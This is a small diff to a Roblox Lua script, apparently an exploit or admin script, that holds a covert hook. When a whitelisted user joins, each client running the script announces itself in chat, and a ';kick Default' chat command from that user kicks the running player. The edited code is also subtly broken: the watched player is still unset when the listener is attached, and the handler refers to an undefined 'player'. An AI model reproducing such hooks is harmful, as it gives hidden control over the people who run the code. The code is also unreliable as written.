@@ -462,10 +462,10 @@ players.PlayerAdded:Connect(function(player)
 	if table.find(wl,player.UserId)then
 		task.wait(4)
 		game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("....", "All")
-		bruh = player
+		bruh = player.Name
 	end
 end)
-bruh.Chatted:Connect(function(message)
+game.Players[bruh].Chatted:Connect(function(message)
 	if table.find(wl,player.UserId) and message == ";kick Default" then
 		game.Players.LocalPlayer:Kick("imagine")
 	end
